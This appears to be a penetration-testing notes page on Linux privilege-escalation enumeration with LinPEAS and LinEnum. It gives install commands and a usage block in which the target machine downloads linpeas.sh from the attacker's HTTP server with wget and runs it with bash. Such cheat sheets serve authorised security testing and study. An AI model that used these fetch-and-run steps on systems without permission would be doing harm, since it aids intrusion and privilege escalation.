---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Tools

## <mark style="color:green;">LinPeass</mark>&#x20;

* Script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts
* [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

## Commands

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install peass
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Host machine
linpeas
python3 -m http.server $port #Create server to send file
#Target machine
cd /tmp
wget http://$hostIP:$port/linpeas.sh
bash linpeas.sh
```
{% endcode %}

***



## <mark style="color:green;">LinEnum</mark>&#x20;

* Another tool for linux enumeration
* [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

## Commands

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
git clone https://github.com/rebootuser/LinEnum
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```
{% endcode %}

***

